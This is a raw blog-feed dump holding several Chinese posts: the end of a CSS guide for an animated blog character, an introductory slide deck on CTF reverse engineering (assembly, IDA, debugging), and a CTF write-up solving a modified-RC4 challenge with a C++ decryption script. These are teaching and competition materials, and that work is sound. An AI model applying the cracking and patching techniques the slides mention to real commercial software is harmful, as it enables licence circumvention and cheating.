class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.myspine-spine-widget</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">999</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.myspine-voice-text</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">margin-top</span>: -<span class="number">70px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">5px</span> <span class="number">5px</span> <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.5</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#14151685</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">3px</span> <span class="number">15px</span> <span class="number">2px</span> <span class="number">#141516</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: left;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">    <span class="attribute">overflow-x</span>: hidden;</span><br><span class="line">    <span class="attribute">overflow-y</span>: scroll;</span><br><span class="line">    <span class="attribute">transition</span>: opacity .<span class="number">3s</span> ease-in-out,height .<span class="number">5s</span> ease-in-out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">.myspine-voice-text::before &#123;</span></span><br><span class="line"><span class="comment">    content: &#x27;VOICE TEXT&#x27;;</span></span><br><span class="line"><span class="comment">    display: block;</span></span><br><span class="line"><span class="comment">    color: #37b2ff;</span></span><br><span class="line"><span class="comment">    font-weight: 700;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.myspine-voice-text</span> &#123;</span><br><span class="line">    <span class="attribute">scrollbar-width</span>: none;</span><br><span class="line">    <span class="attribute">-ms-overflow-style</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.myspine-voice-text</span><span class="selector-pseudo">::-webkit-scrollbar</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="增加调用"><a href="#增加调用" class="headerlink" title="增加调用"></a>增加调用</h1><p>这一部分应该是Melody独有的，不知道别的主题有没有，不import的话css导不进去（</p><h2 id="css调用"><a href="#css调用" class="headerlink" title="css调用"></a>css调用</h2><p>在<strong>主题文件的源目录</strong>的<code>source/css/index.styl</code>中加一句：</p><p><code>@import &quot;_third-party/myspine.css&quot;</code></p><p><img src="/p/blogsFor-hexo-puttingLivelySpineModels/image-20211102202119076.png"></p><h1 id="And…"><a href="#And…" class="headerlink" title="And…"></a>And…</h1><p>在参考文章（<a href="https://jin-yuhan.github.io/posts/4eb44f55/">在博客中添加明日方舟小人 - Stalo Fantasia♪</a>）基础上的improve：</p><ol><li>模型数量扩展，可使用多个模型。</li><li>模型动作展示从顺序切换更改为随机切换，增加互动乐趣。</li><li>Idle动作和语音扩展，可用多个动作和语音，并增加到达一定时长随机切换的功能。</li><li>对interact动作进行时间限制，防止某些动作后摇过长。</li><li>调整部分CSS样式。</li></ol><p>一些TODO：</p><ol><li>砍语音部分（<del>感觉容易社死，</del>下个版本全盘砍掉）。</li><li>将语音文本独立出来做展示文字，可以多项文本随机切换。</li></ol><p>如果想继续魔改的朋友们，把数据通路啥的梳理清楚了就很容易改啦~</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zero2one/入门 </tag>
            
            <tag> u5eful </tag>
            
            <tag> 折腾经历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse for fun =v=</title>
      <link href="p/trainFor-REfreshman/"/>
      <url>p/trainFor-REfreshman/</url>
      
        <content type="html"><![CDATA[<style type="text/css">    .reveal .left_items{         text-align: left;        font-size: 28px;    }    .reveal .subtitles{        text-shadow: 5px 5px 10px #39C5BB;    }    .reveal .subtitle1{        color: #921AFF;        text-shadow: 3px 3px 3px #0080FF;    }    .reveal ul{         display: block;     }</style><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><font color="#921AFF">Reverse</font></h1><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><h2 id="fun"><a href="#fun" class="headerlink" title="fun!!!!!!"></a>fun!!!!!!</h2><blockquote><p>CTF逆向基础篇</p><p> – By <font color="#0080FF">c10udlnk </font><small> (a Sloth RE CTFer</small></p></blockquote><p>&#x3D;&#x3D;&#x3D;</p><h2 class="subtitles">逆向工程概述</h2><p>什么是<font color="red">“逆向”</font>？</p><p><font color="red">“逆向”</font>究竟做些什么？</p><p><font color="red">“逆向”</font>怎么做？</p><p>&#x3D;&#x3D;</p><p class="left_items">逆向工程（Reverse Engineering，简称RE）在软件领域一般是指通过分析程序结构、功能、行为等，<font color="red">掌握其总体逻辑</font>。</p><h3 class="subtitle1">一些应用</h3><ul><li>软件破解</li><li>软件保护</li><li>软件补丁</li><li>游戏外挂</li><li>……</li></ul><p>&#x3D;&#x3D;</p><h3 class="subtitle1">逆向分析方法</h3><h4 id="静态分析法"><a href="#静态分析法" class="headerlink" title="静态分析法"></a>静态分析法</h4><p class="left_items">静态分析法是指<font color="red">在不执行代码的情况下</font>，对代码进行静态分析的方法。例如通过分析程序获取其类型、大小、字符串等相关信息，通过反汇编、反编译工具查看内部代码、分析代码结构、获取代码运行逻辑。</p><p><img src="/p/trainFor-REfreshman/image-20211022211237635.png"></p><h4 id="动态分析法"><a href="#动态分析法" class="headerlink" title="动态分析法"></a>动态分析法</h4><p class="left_items">动态分析法是指<font color="red">在程序文件的执行过程中</font>对代码行为进行分析的方法。通过借助相关调试器我们可以观察程序行为，分析程序内部结构和原理。</p><p>&#x3D;&#x3D;</p><h3 class="subtitle1">打补丁 && 破解</h3><p class="left_items">对应用程序或者进程内存内容的更改，如Windows更新就是一个打补丁的例子，目的是修复程序漏洞，另一方面修改某些商业软件的注册逻辑或者逆向注册算法则常被称之为破解。</p><p class="left_items">Crackme，公开给别人破解的小程序，主要分为以下几类：</p><ol><li>KeyGenMe：要求别人做出它的keygen（注册机）</li><li>ReverseMe：要求别人把它的算法做出逆向分析</li><li>UnpackMe：要求别人把它成功脱壳</li></ol><p>&#x3D;&#x3D;</p><h3 class="subtitle1">CTF - Reverse</h3><p class="left_items"><bold>CTF竞赛</bold>中的逆向题目一般都是以<font color="red">逆向分析加密算法</font>为主，在此基础上加入花指令、反调试、壳、虚拟机、控制流混淆、多进程/线程技术等多种软件保护技术以延缓或者阻挡攻击者的破解。</p><p><small>可以很简单，也可以非常难，难题以综合密码学知识和Linux&#x2F;Windows系统底层原理为主。</small></p><p><img src="/p/trainFor-REfreshman/image-20211023114519818.png"></p><p>&#x3D;&#x3D;</p><h3 class="subtitle1">一般解题步骤</h3><ol><li>获取程序的相关信息（文件类型、源语言、有无加壳……）</li><li>根据信息使用对应的工具</li><li>定位关键代码（关键字符串定位、逻辑定位……）</li><li>结合静态分析和动态分析根据程序逻辑逆向推导出攻击代码</li></ol><p class="left_items"><font color="red">静态分析：</font>看反编译器的结果进行分析。</p><p class="left_items">分析过程不会被程序检测到，可以让一些反调试手段无效。</p><p class="left_items"><font color="red">动态分析：</font>通过调试器对程序进行调试，通过程序的动态执行过程来分析。</p><p class="left_items">分析过程不易受到垃圾代码影响，逻辑复杂的代码可以通过动态调试对功能进行猜测。</p><p>&#x3D;&#x3D;&#x3D;</p><h2 class="subtitles">汇编基础</h2><p>什么是<font color="red">汇编语言</font>？</p><p><font color="red">寄存器</font>、运行栈、函数调用约定……</p><p>来讲点<font color="red">汇编</font>指令集~吧</p><p>&#x3D;&#x3D;</p><h3 class="subtitle1">什么是汇编语言</h3><blockquote><p><small>CSAPP: … assembly code, a textual representation of the machine code giving the individual instructions in the program …</small></p></blockquote><ul><li>是一种底层的计算机语言，并与机器指令一一对应</li><li>汇编语言直接控制&#x2F;描述CPU的操作</li></ul><p>&#x3D;&#x3D;</p><h3 class="subtitle1">寄存器</h3><ul><li>是中央处理器内用来暂存指令、数据和地址的电脑存储器。</li><li>寄存器的存贮容量有限，读写速度非常快。</li><li>在计算机体系结构里，寄存器存储在已知时间点所作计算的中间结果，通过快速地访问数据来加速计算机程序的运行。 </li><li>寄存器位于存储器层次结构的最顶端，也是CPU可以读写的最快的存储器</li></ul><p>&#x3D;&#x3D;</p><p><img src="/p/trainFor-REfreshman/image-20211022215438705.png"></p><p>&#x3D;&#x3D;</p><h3 class="subtitle1">寄存器分类</h3>（以X86为例）<ul><li>通用寄存器：EAX、EBX、ECX、EDX、ESI、EDI、EBP、ESP</li><li>指令指针寄存器：EIP（指向当前要执行的指令地址）</li><li>标志寄存器：EFLAGS（程序根据标志存器众状态的值控制程序的分支语句的跳转）</li><li>段寄存器：CS、DS、SS、ES、FS、GS</li><li>特殊寄存器：DR0-DR7（可用于设置硬件断点）</li></ul><p>&#x3D;&#x3D;</p><h3 class="subtitle1">汇编指令集</h3><p class="left_items">x86汇编代码有两种记法：Intel 和 AT&T。常用的逆向分析工具如IDA Pro、Ollydbg<font color="red">通常使用Intel记法</font>，所以这里主要以Intel语法为例。</p><p class="left_items">Intel 和 AT&T语法的区别：</p><small><ol><li>前缀：AT&amp;T寄存器前缀有’%’，立即数前缀有’$’；但在Intel中并没有这些前缀。</li><li>后缀：在Intel中，通过在数字后面添加’h’来表示十六进制；而在AT&amp;T中则在数字前面添加’0x’，同时intel的指令中并没有后缀。</li><li>操作数方向: AT&amp;T中第一个参数为源操作数，第二个参数为目标操作数。但在Intel中则是相反。</li></ol></small><p>&#x3D;&#x3D;</p><p>指令的类型通常分为3种：</p><ul><li>数据移动指令：mov、lea、push、pop</li><li>逻辑运算指令：add、sub、mul、div、xor、or、and</li><li>流程控制指令：jmp、je、jz（……）、call、ret、leave</li></ul><p>&#x3D;&#x3D;</p><h4 class="subtitle1">mov</h4><p class="left_items">mov指令可以把第二个参数中的值复制到第一个参数中，该指令可在寄存器和寄存器之间操作，也可以在寄存器和内存之间操作，但不能在内存和内存中操作。</p><small><table><thead><tr><th align="center">语法</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">mov reg, reg</td><td align="center">mov ebx, dword ptr [eax]</td></tr><tr><td align="center">movreg, mem</td><td align="center">mov ebx, eax</td></tr><tr><td align="center">movmem, reg</td><td align="center">mov eax, 0x10</td></tr><tr><td align="center">mov reg, con</td><td align="center"></td></tr><tr><td align="center">movmem, con</td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table></small><p>&#x3D;&#x3D;</p><h4 class="subtitle1">lea</h4><p class="left_items">lea： “load effective address”，用于把内存地址赋值给操作数。</p><small><table><thead><tr><th align="center">语法</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">leareg, mem</td><td align="center">learax, [rbx]<br><font color="#39C5BB">;等价于movrax,rbx</font></td></tr><tr><td align="center"></td><td align="center">learax, [rax+rbx]<br><font color="#39C5BB">;等价于addrax,rbx</font></td></tr></tbody></table></small><p>&#x3D;&#x3D;</p><h4 class="subtitle1">push</h4><p class="left_items">push指令调用时，会先把esp（栈顶指针）减4，并将参数复制到栈顶当中</p><h4 class="subtitle1">pop</h4><p class="left_items">pop指令为push的逆操作，调用时会把esp（栈顶指针）指向的数据复制到操作数中，然后对ESP加4</p><small><table><thead><tr><th align="center">语法</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">pushreg<br>pushmem<br>pushcon</td><td align="center">pushrdi<br><font color="#39C5BB">;等价于esp-&#x3D;4;[esp]&#x3D;rdi</font></td></tr><tr><td align="center">popreg<br>popmem</td><td align="center">poprdi<br/><font color="#39C5BB">;等价于rdi&#x3D;[esp];esp+&#x3D;4</font></td></tr></tbody></table></small><p>&#x3D;&#x3D;</p><h4 class="subtitle1">逻辑运算</h4><p>逻辑运算指令以<code>add</code>指令为例，其余双目运算符类似。</p><p class="left_items">add:  将两参数相加并存储到目标参数中。在语法中，必须要至少有一个参数为寄存器。</p><small><table><thead><tr><th align="center">语法</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">addreg, reg<br>addmem, reg<br>addreg, mem<br>add reg, con<br>addmem, con</td><td align="center">add eax,10</td></tr></tbody></table></small><p>&#x3D;&#x3D;</p><h4 class="subtitle1">流程控制</h4><p class="left_items">在汇编中，我们通常用标签以及跳转指令来控制流程，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">begin:  addeax,1</span><br><span class="line">        movedi,eax</span><br><span class="line">        jmpbegin</span><br></pre></td></tr></table></figure><p class="left_items">汇编运行到最后一句的时候，执行jmp begin，程序执行跳到begin标签处。</p><p>通常跳转都会和cmp（比较指令）和一起使用。</p><p>&#x3D;&#x3D;</p><h4 class="subtitle1">流程控制</h4><p class="left_items">cmp：比较指令，将两个操作数的值进行比较，比较的结果会存在状态寄存器中，但不会改变操作数的值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmpreg, reg</span><br><span class="line">cmpmem, reg</span><br><span class="line">cmpreg, mem</span><br><span class="line">cmpreg, con</span><br></pre></td></tr></table></figure><p class="left_items">与跳转指令结合使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp ebx, eax  ;将ebx和eax进行比较</span><br><span class="line">je  label     ;如果比较结果相等的话则进行跳转equal</span><br></pre></td></tr></table></figure><p class="left_items">其他跳转指令：</p><p><code>jne</code>（不相等）、 <code>jg</code>（大于）、<code>jge</code>（大于等于）、<code>jl</code>（小于）、<code>jle</code>（小于等于）……</p><p>&#x3D;&#x3D;</p><h4 class="subtitle1">流程控制</h4><p class="left_items">call：函数调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call func</span><br><span class="line">;相当于push eip | jmp func</span><br></pre></td></tr></table></figure><p class="left_items">ret：函数返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret</span><br><span class="line">;相当于pop eip</span><br></pre></td></tr></table></figure><p class="left_items">leave：还原ebp、esp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">;相当于mov esp, ebp | pop ebp</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;&#x3D;</p><h2 class="subtitles">相关工具</h2><p>锵锵~</p><p><font color="red">常用工具</font>和<font color="red">最常用工具的使用方法</font>都在这里~</p><p>&#x3D;&#x3D;</p><h3 class="subtitle1">实验环境</h3><small><ul><li><font color="red">操作系统：</font>Windows + Linux虚拟机&#x2F;服务器&#x2F;WSL2</li><li><font color="red">查看PE信息：</font>ExeinfoPE、PEID、LordPE……</li><li><font color="red">反汇编&#x2F;反编译：</font>IDA7.5&#x2F;IDA7.0，Ollydbg，ghidra……</li><li><font color="red">IDA插件：</font>findcrypt3、keypatch、lazyIDA……</li><li><font color="red">调试：</font>IDA7.5&#x2F;IDA7.0（多平台反汇编、反编译软件，内置Windows、Linux、MacOS、ARM等多平台调试器），Ollydbg（Win32反汇编工具、调试器），WinDbg（Windows内核调试器），GDB（Linux平台调试器）……</li><li><font color="red">少见语言反编译</font>：dnSpy（.Net）、JEB（apk）、jd-gui（Java字节码）……</li><li><font color="red">参考书籍：</font><strong>加密与解密4</strong> 、汇编语言、CSAPP、逆向工程核心原理</li></ul></small><p>&#x3D;&#x3D;</p><h3 class="subtitle1">IDAPro</h3><p>The IDA Disassembler and Debugger is an interactive, programmable, extensible, multi-processor disassembler hosted on Windows, Linux, or Mac OS X. </p><ul><li>Disassembler</li><li>Debugger</li><li>Interactive</li><li>Programmable</li></ul><p>&#x3D;&#x3D;</p><p><img src="/p/trainFor-REfreshman/image-20211023125101532.png"></p><p>&#x3D;&#x3D;</p><h3 class="subtitle1">一些快捷键</h3><ul><li><code>F5</code>：反编译</li><li><code>TAB</code>：反汇编窗口、反编译窗口切换</li><li><code>shift + F12</code>：查看字符串</li><li><code>x</code>：交叉引用</li><li><code>/</code>：注释</li><li><code>n</code>：修改标识符</li><li><code>ENTER / 双击</code>：进入函数（跳转到鼠标指向的位置）</li><li><code>g</code>：跳转到某一地址</li><li><code>ESC</code>：后退上一位置</li><li><code>crtl + s</code>：查看区段</li></ul><p>&#x3D;&#x3D;</p><h3 class="subtitle1">一些快捷键</h3><ul><li><code>p</code>：create function</li><li><code>c</code>：covert to code</li><li><code>d</code>：covert to data</li><li><code>h</code>：covert to hex</li><li><code>r</code>：covert to ascii</li><li><code>a</code>：covert to string</li><li><code>u</code>：undefine</li></ul><p>&#x3D;&#x3D;</p><h3 class="subtitle1">HexRays Decompiler</h3><p><img src="/p/trainFor-REfreshman/image-20211023130040921.png"></p><p><img src="/p/trainFor-REfreshman/image-20211023130101470.png"></p><p>&#x3D;&#x3D;</p><h3 class="subtitle1">动态调试</h3><p>动态调试教程传送门 -&gt; <a href="https://c10udlnk.top/p/reSkillsOn-Debugging">https://c10udlnk.top/p/reSkillsOn-Debugging</a></p><ul><li><code>F2</code>：CC断点</li><li><code>F4</code>：执行到所指向的位置</li><li><code>F7</code>：单步执行（步入）</li><li><code>F8</code>：单步执行（步过）</li><li><code>F9</code>：执行到下一断点</li></ul><p>调试时，数据、堆栈、寄存器、汇编代码都可以直接修改。</p><p>&#x3D;&#x3D;&#x3D;</p><h2 class="subtitles">一点练习</h2><p>既然你已经学会Hello world了，</p><p>那我们就来<font color="red">实践一下</font>吧~</p><p>&#x3D;&#x3D;</p><h3 class="subtitle1">实验步骤</h3><small><ol><li>通过静态分析和动态调试分析程序执行逻辑</li><li>通过分析程序执行逻辑还原Check算法</li><li>逆向Check算法获取flag</li></ol></small><table><thead><tr><th align="center">Demo</th><th align="center">关键点</th></tr></thead><tbody><tr><td align="center">Xor_Win32</td><td align="center">xor、win32动态调试</td></tr><tr><td align="center">Xor_Linux</td><td align="center">xor、linux动态调试</td></tr><tr><td align="center">babyMaze</td><td align="center">读懂伪代码，了解程序逻辑</td></tr><tr><td align="center">base64</td><td align="center">常见编码算法分析</td></tr></tbody></table><p>&#x3D;&#x3D;&#x3D;</p><h2 class="subtitles">打广告时间……</h2><small><ol><li><p>2021年华师CTF新生赛就要开始了！欢迎大家踊跃报名！</p><p>有炒鸡丰富的奖品等着你们，还有机会加入Sloth跟我们一起玩yo~ &gt;v&lt;</p><p>（详细时间安排关注@ISCNU公众号）</p></li><li><p>HSCTF{Sloth}安全吹水群👇</p></li></ol><p>&#x3D;&#x3D;</p><p><img src="/p/trainFor-REfreshman/image-20211023172643781.png"></p></small>]]></content>
      
      
      <categories>
          
          <category> Train </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> zero2one/入门 </tag>
            
            <tag> u5eful </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2021绿城杯</title>
      <link href="p/wpFor-2021lcb/"/>
      <url>p/wpFor-2021lcb/</url>
      
        <content type="html"><![CDATA[<p>终于良心发现回来水wp的博客了&#x3D; &#x3D;</p><p>做完RE以后跑去做Misc结果到比赛结束都没做出来，早知道就提早下班了（bushi，有LSB隐写的wp请速dd我T.T</p><a id="more"></a><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h2><p>一个<del>魔改RC4的</del>签到题。</p><p><img src="/p/wpFor-2021lcb/image-20211007144710345.png"></p><p>显然有花指令，<code>xor eax, eax</code>以后zf标志位为1，所以jz相当于直接jmp，可以将之间的指令都patch成<code>nop</code>。</p><p><img src="/p/wpFor-2021lcb/image-20211007145732920.png"></p><p>就是这些垃圾指令，直接nop掉就好（</p><p>然后能看到逻辑，就是一个简单的RC4，但是有一点点魔改。</p><p>RC4 init（多了一个xor 0x37）：</p><p><img src="/p/wpFor-2021lcb/image-20211007150423433.png"></p><p>RC4加密过程：</p><p><img src="/p/wpFor-2021lcb/image-20211007150521829.png"></p><p>密钥是<code>tallmewhy</code></p><p><img src="/p/wpFor-2021lcb/image-20211007150857191.png"></p><p>最后的密文存在v19开头这里：</p><p><img src="/p/wpFor-2021lcb/image-20211007150933826.png"></p><p>动态调一下就能直接拿到密文。</p><p>最后exp（拿自己之前写的RC4实现改的）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// By c10udlnk(https://github.com/c10udlnk)</span></span><br><span class="line"><span class="comment">// Enjoy it!</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> S_Box[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// RC4 initial</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> * key,<span class="keyword">int</span> keyLen)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> T[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">        S_Box[i]=i;</span><br><span class="line">        T[i]=key[i%keyLen];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">        j=(j+S_Box[i]+T[i])%<span class="number">256</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp=S_Box[i];</span><br><span class="line">        S_Box[i]=S_Box[j];</span><br><span class="line">        S_Box[j]=tmp^<span class="number">0x37</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// RC4 Encryption and Decryption (The same)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RC4</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> * key,<span class="keyword">int</span> keyLen,<span class="keyword">unsigned</span> <span class="keyword">char</span> * data,<span class="keyword">int</span> dataLen)</span></span>&#123;</span><br><span class="line">    Init(key,keyLen);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dataLen;k++)&#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+S_Box[i])%<span class="number">256</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp=S_Box[i];</span><br><span class="line">        S_Box[i]=S_Box[j];</span><br><span class="line">        S_Box[j]=tmp;</span><br><span class="line">        data[k]^=S_Box[(S_Box[i]+S_Box[j])%<span class="number">256</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Hex to Char</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> HexChar[<span class="number">16</span>]=&#123;<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hex2char</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> * hex,<span class="keyword">unsigned</span> <span class="keyword">char</span> * chr,<span class="keyword">int</span> hexLen)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lastIdx=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;hexLen;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(index=<span class="number">0</span>;index&lt;<span class="number">16</span>;index++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(HexChar[index]==hex[i]) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index==<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Please check your hex string at POSITION [%d] again.\n&quot;</span>,i);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&amp;<span class="number">1</span>) chr[i/<span class="number">2</span>]=lastIdx*<span class="number">16</span>+index;</span><br><span class="line">        <span class="keyword">else</span> lastIdx=index;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 所有字符串均为经hex编码后的形式，且为小写字母</span></span><br><span class="line">    <span class="comment">// 搭配Python3的binascii.hexlify()使用最佳</span></span><br><span class="line">    <span class="comment">// RC4的加密与解密算法相同</span></span><br><span class="line">    <span class="comment">// 记得更改对应的dataLen和keyLen</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key_hex[]=<span class="string">&quot;74616c6c6d65776879&quot;</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> data_hex[]=<span class="string">&quot;f58c8de49fa5286530f4ebd324a9911a6fd46ad70b8de8b8834a5a6ebecbf44b99d6e6547a4f5014e5ec&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> keyLen=<span class="number">9</span>,dataLen=<span class="number">42</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span 